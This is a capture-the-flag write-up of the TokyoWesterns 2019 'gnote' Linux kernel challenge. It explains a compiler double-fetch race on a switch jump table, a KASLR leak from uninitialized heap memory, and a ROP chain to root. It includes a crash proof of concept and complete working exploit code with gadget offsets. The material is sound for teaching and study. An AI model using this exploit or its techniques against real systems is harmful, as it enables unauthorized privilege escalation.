---
title: TokyoWesterns CTF 2019 - gnote
authors: pernicious
date: 2019-09-04
categories: binary-exploitation
---

I found this challenge from TokyoWesterns CTF to be especially interesting and refreshing.
The format is that of a standard Linux kernel challenge: we are provided with a kernel image, filesystem, and script to run everything under qemu.
We have access to an unprivileged shell over ssh, and the flag is only readable by root. The author also provided source for the custom kernel module.

## The kernel module

Let's first understand how the kernel module operates. It's quite simple and not very much code. It registers a procfs entry `/proc/gnote` with a read and write handler.  

Some global variables that are relevant:

```c
#define MAX_NOTE 8

static DEFINE_MUTEX(lock);

struct note {
  unsigned long size;
  char *contents;
};

unsigned long cnt;
unsigned long selected;
struct note notes[MAX_NOTE];
```

The lock will be held during the entirety of each read/write handler.  

There is an array of 8 note structures, which are simply `char*`s with a size. `cnt` will be used to keep track of how many of these notes there are, and `selected` indicates the currently selected note.

As the code isn't too bad, here are the handlers in full:

```c
ssize_t gnote_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
  unsigned int index;
  mutex_lock(&lock);
  /*
   * 1. add note
   * 2. edit note
   * 3. delete note
   * 4. copy note
   * 5. select note
   * No implementation :(
   */
  switch(*(unsigned int *)buf){
    case 1:
      if(cnt >= MAX_NOTE){
        break;
      }
      notes[cnt].size = *((unsigned int *)buf+1);
      if(notes[cnt].size > 0x10000){
        break;
      }
      notes[cnt].contents = kmalloc(notes[cnt].size, GFP_KERNEL);
      cnt++;
      break;
    case 2:
      printk("Edit Not implemented\n");
      break;
    case 3:
      printk("Delete Not implemented\n");
      break;
    case 4:
      printk("Copy Not implemented\n");
      break;
    case 5:
      index = *((unsigned int *)buf+1);
      if(cnt > index){
        selected = index;
      }
      break;
  }
  mutex_unlock(&lock);
  return count;
}

ssize_t gnote_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
  mutex_lock(&lock);
  if(selected == -1){
    mutex_unlock(&lock);
    return 0;
  }
  if(count > notes[selected].size){
    count = notes[selected].size;
  }
  copy_to_user(buf, notes[selected].contents, count);
  selected = -1;
  mutex_unlock(&lock);
  return count;
}
```

Functionality-wise, we can allocate up to 8 notes of maximum size 0x10000 and select any of them by writing to the proc entry.
By reading, we can obtain the raw contents of a previously allocated/selected note.

Bug-wise, there are two things we notice.

First of all, the user-supplied `buf` pointer in the write handler is directly dereferenced.
The proper way to read userspace memory is with `copy_from_user`/`get_user`. These functions verify the memory range being accessed is in fact entirely in userspace and handles page faults as well.
As a side note, the `buf`/`count` arguments are actually checked to be in userspace higher up the callchain in [`vfs_write`](https://elixir.bootlin.com/linux/v4.19.65/source/fs/read_write.c#L541), meaning we can't pass kernelspace pointers into this function. We could crash the kernel with a userspace address that isn't mapped, but that's not very useful. There's also the small detail that it assumes `buf` contains 2 unsigned integers without checking that `count` is at least 8, meaning the latter bytes of `buf` could be right at the start of kernelspace. Again, not very useful. So in theory, dereferencing `buf` is a problem, but it doesn't seem to actually be one here...

The second issue is that the contents of the note aren't initialized. Using the read handler, we can leak out uninitialized heap memory from the general purpose kmalloc caches (up to size 0x10000). This will allow us to get leaks to bypass kaslr.

So at the source level, there doesn't seem to be any exploitable bugs...... Let's look at the the kernel module binary, which should provide some ground truth.

## gcc considered harmful

The kernel module binary can be found within the provided filesystem, `rootfs.cpio`. To inspect its contents, you can do the following in a shell: `mkdir fs; cd fs; sudo cpio -ivd < ../rootfs.cpio` (I used sudo to keep everything owned by root, but you do you). There will be a `gnote.ko` file in the root directory, which can be loaded into your favorite accessible disassembler.

Looking at the write handler, we see the following code was emitted for the switch statement (`switch(*(unsigned int*)buf)`):

```
; note that rbx is the buf argument, user-controlled
cmp dword ptr [rbx], 5
ja default_case
mov eax, [rbx]
mov rax, jump_table[rax*8]
jmp rax
```

This is a pretty standard pattern for compilers to emit for switch statements. The interesting thing here is that instead of the single dereference of `buf` present in the source, `buf` is actually dereferenced twice, a double fetch. If the value at `rbx` is less than or equal to 5 at the time of the comparison, but another userspace thread modifies the value to something larger before the second dereference, we could index out of bounds of the jump table, potentially jumping anywhere. The race is pretty tight, the value modification needing to occur during a single x86 instruction, but that's not really an issue when we can hot loop trying to trigger it (nothing bad will happen if the comparison sees the large value and goes to the default case).

To hit the race, we will have one thread constantly changing the value from a benign index to a malicious one. The main thread will loop calling the write handler.

Here's a poc that triggers the race with a malicious index of 0x41414141:

```c
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

#define FAKE_IDX "0x41414141"

void* thread_func(void* arg) {
    asm volatile("mov $" FAKE_IDX ", %%eax\n"
                 "mov %0, %%rbx\n"
                 "lbl:\n"
                 "xchg (%%rbx), %%eax\n"
                 "jmp lbl\n"
                 :
                 : "r" (arg)
                 : "rax", "rbx"
                 );
    return 0;
}

int main() {
    int fd = open("/proc/gnote", O_RDWR);

    unsigned int buf[2] = {0, 0x10001};

    pthread_t thr;
    pthread_create(&thr, 0, thread_func, &buf[0]);

    while (1)
        write(fd, buf, sizeof(buf));

    return 0;
}
```

The race hits almost instantaneously:

```
BUG: unable to handle kernel paging request at 00000001ca337aa0
PGD 8000000001446067 P4D 8000000001446067 PUD 0 
Oops: 0000 [#1] SMP PTI
CPU: 3 PID: 96 Comm: t Tainted: P           O      4.19.65 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.12.1-0-ga5cab58e9a3f-prebuilt.qemu.org 04/01/2014
RIP: 0010:gnote_write+0x20/0xd0 [gnote]
Code: Bad RIP value.
RSP: 0018:ffffa2b600257da0 EFLAGS: 00010293
RAX: 0000000041414141 RBX: 00007fffe1887448 RCX: ffffa2b600257ea0
RDX: ffff9db5c1b59480 RSI: 00007fffe1887448 RDI: ffffffffc0298100
RBP: ffffa2b600257db0 R08: 0000000000000001 R09: 0000000000000008
R10: ffff9db5c1b65438 R11: 0000000000000000 R12: 0000000000000008
R13: ffffa2b600257ea0 R14: 00007fffe1887448 R15: 0000000000000000
FS:  00007fffe1887480(0000) GS:ffff9db5c3980000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffffffc0295ff6 CR3: 000000000146c000 CR4: 00000000001006e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
 proc_reg_write+0x39/0x60
 __vfs_write+0x26/0x150
 vfs_write+0xad/0x180
 ksys_write+0x48/0xc0
 __x64_sys_write+0x15/0x20
 do_syscall_64+0x57/0x270
 ? do_page_fault+0x22/0x30
 entry_SYSCALL_64_after_hwframe+0x44/0xa9
RIP: 0033:0x4011ad
Code: 48 8b 54 24 08 48 8b 74 24 10 8b 7c 24 1c 48 83 c4 28 e9 e7 00 00 00 31 c0 ff c0 87 07 c3 b0 3c b4 00 0f b7 c0 49 89 ca 0f 05 <48> 3d 7c ff ff ff 76 0f f7 d8 50 e8 33 01 00 00 59 89 08 48 83 c8
RSP: 002b:00007fffe1887438 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
RAX: ffffffffffffffda RBX: 00007fffe1887448 RCX: 00000000004011ad
RDX: 0000000000000008 RSI: 00007fffe1887448 RDI: 0000000000000003
RBP: 0000000000000003 R08: 000000000000003f R09: 0000000000000000
R10: 00000000004011ad R11: 0000000000000202 R12: 0000000000000001
R13: 00007fffe1887518 R14: 00007fffe1887480 R15: 0000000000000000
Modules linked in: gnote(PO)
CR2: 00000001ca337aa0
---[ end trace b075c1b449229ebd ]---
RIP: 0010:gnote_write+0x20/0xd0 [gnote]
Code: Bad RIP value.
RSP: 0018:ffffa2b600257da0 EFLAGS: 00010293
RAX: 0000000041414141 RBX: 00007fffe1887448 RCX: ffffa2b600257ea0
RDX: ffff9db5c1b59480 RSI: 00007fffe1887448 RDI: ffffffffc0298100
RBP: ffffa2b600257db0 R08: 0000000000000001 R09: 0000000000000008
R10: ffff9db5c1b65438 R11: 0000000000000000 R12: 0000000000000008
R13: ffffa2b600257ea0 R14: 00007fffe1887448 R15: 0000000000000000
FS:  00007fffe1887480(0000) GS:ffff9db5c3980000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffffffc0295ff6 CR3: 000000000146c000 CR4: 00000000001006e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Kernel panic - not syncing: Fatal exception
```

This crashed when indexing into the jump table: `mov rax, jump_table[0x41414141*8]`

## Debugging

Before getting into the exploit, I thought I'd quickly mention my debugging setup, in case it might help someone not familiar with such things. Feel free to skip this part.

We extracted the filesystem earlier, and it'd be useful to go in the reverse direction. We can do this with the following script I called `update.sh` (again, don't need sudo if you didn't use it earlier):

```bash
#!/bin/sh
cd fs/
sudo find . -print0 | sudo cpio --null -o --format=newc > ../dbgrootfs.cpio
```

We can now place our exploit directly in `fs/tmp/` for quick local testing, or change the `init` script to spawn a root shell instead to do things like inspect `/proc/kallsyms`.

I created a modified copy of the run script as well. The `-s` flag was added to have qemu run a gdbserver on port 1234, and kaslr was disabled to make setting breakpoints in gdb much simpler.

```bash
#!/bin/sh
./update.sh
stty intr ^]
qemu-system-x86_64 -m 64M -kernel bzImage -initrd dbgrootfs.cpio -append "loglevel=8 console=ttyS0 nokaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep -monitor /dev/null 2>/dev/null -s
stty intr ^C
```

Another useful thing to know is how to extract the uncompressed kernel image from `bzImage` with [`extract-vmlinux`](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux): `./extract-vmlinux bzImage > vmlinux`. This lets you do `gdb ./vmlinux`. Within gdb, you can connect to the qemu's gdbserver with `target remote 0:1234`. `vmlinux` can also be used to obtain rop gadgets that will be useful later (e.g. `ROPgadget --binary vmlinux` or whatever preferred rop gadget tool).

## Exploit

### getting leaks

The first order of business will be getting a kernel text leak, so we know where to jump once we have control of `rip`. To get a leak, we will use the uninitialized memory issue.

A quick aside on the kernel's slub allocator (the default). Everything is allocated from a specific cache. Each cache contains chunks of only one size. There are specialized caches for specific structs (`mm_struct`, `inode_cache`, etc.) and general purpose caches that service allocations of various sizes (`kmalloc-32`, `kmalloc-64`, etc.). Free chunks are placed in a singly-linked freelist which acts in a lifo manner. That is, if we free a chunk then allocate the same size, we get back the same chunk.

To leak a kernel address, we need some target object with a kernel address (like a function pointer) that gets allocated from the general purpose caches. We will allocate the object, free it, allocate a note of the same size to reclaim the chunk, and read out the uninitialized contents that still contain the kernel pointer.

There are certainly plenty of objects to choose from, `timerfd_ctx` is one such object. A timerfd is basically a timer backed by a file descriptor. When a timerfd is armed with some timeout, one of the fields in its corresponding `timerfd_ctx` gets set to a function pointer that will be executed when the timer fires.

A `timerfd_ctx` gets allocated on creation (the `timerfd_create` syscall) [here](https://elixir.bootlin.com/linux/v4.19.65/source/fs/timerfd.c#L409). The code is written such that if `kmalloc` is called with a constant size (which in this case it is, the size being `sizeof(struct timerfd_ctx)`) the compiler optimizes it and emits a direct call to `kmem_cache_alloc_trace` with the general purpose cache for that size. Setting a breakpoint on that call, we can inspect the cache being passed. One of the fields is a `char* name`, which we see in this case is `kmalloc-256`. This tells us that `timerfd_ctx`s are allocated in chunks of size 0x100.

An important detail is that freeing a `timerfd_ctx` is done with [`kfree_rcu`](https://elixir.bootlin.com/linux/v4.19.65/source/fs/timerfd.c#L226). In this scenario, rcu is a way to wait until an object is no longer in use by any other threads, at which point it will be safe to free. The way it actually does this is by preventing context switches whenever the object in question is being used, and waiting until all cores have experienced a context switch before freeing the object. You can read all about it in [this 3 part article series](https://lwn.net/Articles/262464/). What this means for us is that after closing the file descriptor for the timerfd (which triggers the call to `kfree_rcu`), the `timerfd_ctx` chunk may not actually be free yet. To solve this problem, we simply do a `sleep(1)` to ensure the rcu grace period has expired.

Once the `timerfd_ctx` is freed, we can allocate a note of size 0x100 and leak the function pointer.

### getting rip

Since we are accessing the jump table out of bounds, it'd be nice if we could fully control some 64bit value in memory above the jump table, to act as our fake jump table entry.
The way the write handler is implemented, it's actually possible to place an invalid size (greater than 0x10000) in the notes array. Since the notes array is located in the module's bss, it will be a constant offset from the jump table, meaning we could reliably index out of bounds to use this size as the fake jump target. However, the size is read as an unsigned integer from userspace, giving us control of only 4 bytes. That'd be fine if we could jump right to userspace, but since smep is on (it's explicitly enabled in the qemu command line, and we can check that [bit 20](https://en.wikipedia.org/wiki/Control_register#CR4) in cr4 (0x10006e0) is set), this doesn't help us.

In the kernel oops message above, note that the crashing address is actually a userspace address, since `&jump_table + 0x41414141*8` overflowed a 64 bit integer. Also note that smap is off (bit 21 of cr4 is unset, plus the direct dereference of `buf` implies it must be off). This gives us a strategy to fully control `rip`: place a fake jump table entry in userspace.

One problem is kaslr, which will randomize the base address of the module, and consequently the jump table. Instead of trying to figure out some heap allocated object containing a pointer into the module (which we would leak with the uninitialized memory issue), we can simply "spray" fake jump table entries in userspace.

`mmap_min_addr` is 0x1000, so we start with that page. The minimum base address for the module is `0xffffffffc0000000`, so we will use a malicious index of `0x8000200` (`0xffffffffc0000000 + 0x8000200*8 == 0x1000`). Observing a few runs, kaslr seemed to only randomize 3 nibbles of the module's base address, so we will map 0x1000 pages (mapping much more than this fails with ENOMEM anyway).

The one problem with this is that it requires mapping `0x1000 - 0x10001000`, which happens to encompass the default ELF base address of `0x400000`...

To deal with this, a linker flag can be added to rebase the binary: `-Wl,--section-start=.note.gnu.build-id=0x40000158` (the 0x158 alignment from the original binary, which you can check with `readelf -S`)

Running the exploit a few times with our new malicious index shows that the accessed address is always aligned to `0x098`, so we will place our fake jump table target at this alignment on each page.

### getting root

Now that we have `rip`, we need something useful to set it to. Since we don't really have much stack control, a stack pivot to userspace seems a decent way to go. For this, we can use an `xchg eax, esp ; ret` gadget, which will set `rsp` to the value of `rax` with the high 32 bits cleared, bringing `rsp` into userspace. `rax` will be pointing at the gadget itself, so we will need to map the page containing `gadget&0xffffffff` and place our ropchain there.

One plan of attack is to disable smep in rop by unsetting bit 20 of cr4, then jump to userspace where we will have shellcode to `commit_creds(prepare_kernel_cred(0))` and perform the return to userspace. Interestingly enough, page table isolation screws us over... Page table isolation, the Linux kernel patch mitigating the Meltdown cpu issue, involves using separate page tables when executing in kernelspace and userspace. The page tables for kernelspace have all userspace pages marked as non-executable. In other words, bit 20 of cr4 doesn't really matter. So we will have to implement `commit_creds(prepare_kernel_cred(0))` in rop.

After doing that, we need to return to user context. During the course of our ropchain, we've unfortunately lost both `rsp` and `rbp`, so resetting the stack and returning down the original callchain isn't an option. Instead we'll rop to within `entry_SYSCALL_64` (the entry point for syscalls). After handling the syscall, it performs the page table switch followed by a `sysretq`. `sysretq` is a specialized instruction that returns to ring 3. It sets `rip` to `rcx` and `rflags` to `r11`, which we can set in our ropchain.

Once we've returned to user context, we pop a root shell and read the flag.

I sincerely thank the challenge author for the awesome bug and awesome challenge. Thoroughly enjoyed.

Here's the entire exploit code:

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/timerfd.h>

#define FAKE_IDX "0x8000200"

void* swapper(void* arg) {
    asm volatile("mov $" FAKE_IDX ", %%eax\n"
                 "mov %0, %%rbx\n"
                 "lbl:\n"
                 "xchg (%%rbx), %%eax\n"
                 "jmp lbl\n"
                 :
                 : "r" (arg)
                 : "rax", "rbx", "memory"
                 );
    return 0;
}

// apparently dietlibc is dumb and doesn't know where syscall arguments go...
int timerfd_create(int clockid, int flags) {
    int ret;
    int sysno = __NR_timerfd_create;
    asm volatile("movl %1, %%eax\n"
                 "movl %2, %%edi\n"
                 "movl %3, %%esi\n"
                 "syscall\n"
                 "movl %%eax, %0\n"
                 : "=r" (ret)
                 : "r" (sysno), "r" (clockid), "r" (flags)
                 : "rax", "rdi", "rsi", "rcx"
            );
    return ret;
}

void pop_shell() {
    char* argv[] = {"/bin/sh", 0};
    execve(argv[0], argv, 0);
}

int main() {
    int fd = open("/proc/gnote", O_RDWR);

    struct itimerspec timespec = { {0, 0}, {100, 0}};
    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &timespec, 0); // alloc timerfd with function pointer
    close(tfd); // kfree timerfd
    sleep(1); // trigger rcu grace period

    unsigned int buf[2] = {1, 0x100};
    write(fd, buf, sizeof(buf)); // alloc 0x100 note to reclaim timerfd
    
    buf[0] = 5;
    buf[1] = 0;
    write(fd, buf, sizeof(buf)); // select note i

    unsigned long raw_leak[0x100/8] = {0};
    read(fd, raw_leak, sizeof(raw_leak));

    unsigned long kern = raw_leak[5]-0x15a2f0;
    unsigned long prepare_kernel_cred = kern+0x69fe0;
    unsigned long commit_creds = kern+0x69df0;
    // 0xffffffff8101992a : xchg eax, esp ; ret
    unsigned long pivot = kern+0x1992a;
    // 0xffffffff8101c20d : pop rdi ; ret
    unsigned long pop_rdi = kern+0x1c20d;
    // 0xffffffff8121ca6a : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff8121ca66 ; pop rbp ; ret
    unsigned long mov_rdi_rax = kern+0x21ca6a;
    // 0xffffffff81037523 : pop rcx ; ret
    unsigned long pop_rcx = kern+0x37523;
    // 0xffffffff811025c8 : pop r11 ; pop rbp ; ret
    unsigned long pop_r11 = kern+0x1025c8;
    // mov rdi, cr3 ; or rdi, 0x1000 ; mov cr3, rdi ; pop rax ; pop rdi ; pop rsp ; swapgs ; sysretq
    unsigned long sysretq = kern+0x600116;

    unsigned long* fake_stack = (unsigned long*)((unsigned long)pivot&0xffffffff);
    mmap((void*)(((unsigned long)fake_stack&~0xfff)-0x10000), 0x20000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    unsigned long* rop = fake_stack;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = mov_rdi_rax;    
    *rop++ = 0;
    *rop++ = commit_creds;
    *rop++ = pop_rcx;
    *rop++ = (unsigned long)&pop_shell;
    *rop++ = pop_r11;
    *rop++ = 0x202;
    *rop++ = 0;
    *rop++ = sysretq;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (unsigned long)fake_stack&~0xf;

    buf[0] = 0;
    buf[1] = 0x10001;

#define MAP_SIZE 0x1000000
    unsigned long* fake_table = mmap((void*)0x1000, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    for (int i = 0x98/8; i < MAP_SIZE/8; i+=0x1000/8)
        fake_table[i] = pivot;

    pthread_t swapper_thr;
    pthread_create(&swapper_thr, 0, swapper, &buf[0]);

    while (1)
        write(fd, buf, sizeof(buf));

    return 0;
}
```
